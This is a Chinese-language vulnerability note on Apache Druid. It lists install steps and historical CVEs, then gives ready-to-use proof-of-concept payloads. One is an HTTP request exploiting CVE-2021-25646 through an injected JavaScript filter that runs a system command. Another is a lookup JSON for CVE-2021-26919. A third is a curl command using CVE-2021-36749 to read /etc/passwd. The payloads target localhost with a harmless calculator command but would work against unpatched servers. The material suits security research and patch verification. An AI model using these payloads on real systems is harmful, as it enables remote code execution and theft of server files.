# Apache Druid

Apache Druid是面向列的分布式数据存储，由Java编写。其他类似的column-oriented型数据库，参考： https://en.wikipedia.org/wiki/List_of_column-oriented_DBMSes

官方文档： https://druid.apache.org/docs/latest/tutorials/index.html

源码下载： https://github.com/apache/druid

安装包下载： https://archive.apache.org/dist/druid/

Linux下安装、启动（要求Java8）
```
tar -zxvf apache-druid-0.17.0-bin.tar.gz
cd /apache-druid-0.17.0/bin
./start-nano-quickstart
```
访问`http://localhost:8888`

历史漏洞

|漏洞编号|漏洞类型|影响版本|
|:----:|:----:|:----:|
|CVE-2021-36749|文件读取|< 0.21.0|
|CVE-2021-26920|文件读取|0.20.x|
|CVE-2021-26919|RCE|< 0.20.2|
|CVE-2021-25646|RCE|<= 0.20.0|
|CVE-2020-1958|身份认证绕过|0.17.0|

## CVE-2020-1958
Ref： https://github.com/ggolawski/CVE-2020-1958

## CVE-2021-25646
Ref： https://www.zerodayinitiative.com/blog/2021/3/25/cve-2021-25646-getting-code-execution-on-apache-druid

POC
```
POST /druid/indexer/v1/sampler HTTP/1.1
Host: 127.0.0.1:8888
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/json
Content-Length: 994
Connection: close


{"type": "index", "spec": {"ioConfig": {"type": "index", "inputSource": {"type": "inline", "data": "{\"isRobot\":true,\"channel\":\"#x\",\"timestamp\":\"2021-2-1T14:12:24.050Z\",\"flags\":\"x\",\"isUnpatrolled\":false,\"page\":\"1\",\"diffUrl\":\"https://xxx.com\",\"added\":1,\"comment\":\"Botskapande Indonesien omdirigering\",\"commentLength\":35,\"isNew\":true,\"isMinor\":false,\"delta\":31,\"isAnonymous\":true,\"user\":\"Lsjbot\",\"deltaBucket\":0,\"deleted\":0,\"namespace\":\"Main\"}"}, "inputFormat": {"type": "json", "keepNullColumns": true}}, "dataSchema": {"dataSource": "sample", "timestampSpec": {"column": "timestamp", "format": "iso"}, "dimensionsSpec": {}, "transformSpec": {"transforms": [], "filter": {"type": "javascript", "dimension": "added", "function": "function(value) {java.lang.Runtime.getRuntime().exec('open -a Calculator')}", "": {"enabled": true}}}}, "type": "index", "tuningConfig": {"type": "index"}}, "samplerConfig": {"numRows": 500, "timeoutMs": 15000}}
```

## CVE-2021-26919
POC
```
{
    "type": "pollingLookup",
    "pollPeriod": "PT10M",
    "dataFetcher":
    {
        "type": "jdbcDataFetcher",
        "connectorConfig": "jdbc://mysql://localhost:3306/my_data_base",
        "table": "lookup_table_name",
        "keyColumn": "key_column_name",
        "valueColumn": "value_column_name"
    },
    "cacheFactory":
    {
        "type": "onHeapPolling"
    }
}
```

## CVE-2021-36749

页面上点击load data，然后选择`http(s)://`，点击connect后在URIs处填入`file://etc/passwd`即可读取文件
POC
```
curl http://127.0.0.1:8888/druid/indexer/v1/sampler?for=connect -H "Content-Type:application/json" -X POST -d "{\"type\":\"index\",\"spec\":{\"type\":\"index\",\"ioConfig\":{\"type\":\"index\",\"firehose\":{\"type\":\"http\",\"uris\":[\" file:///etc/passwd \"]}},\"dataSchema\":{\"dataSource\":\"sample\",\"parser\":{\"type\":\"string\", \"parseSpec\":{\"format\":\"regex\",\"pattern\":\"(.*)\",\"columns\":[\"a\"],\"dimensionsSpec\":{},\"timestampSpec\":{\"column\":\"no_ such_ column\",\"missingValue\":\"2010-01-01T00:00:00Z\"}}}}},\"samplerConfig\":{\"numRows\":500,\"timeoutMs\":15000}}"
```
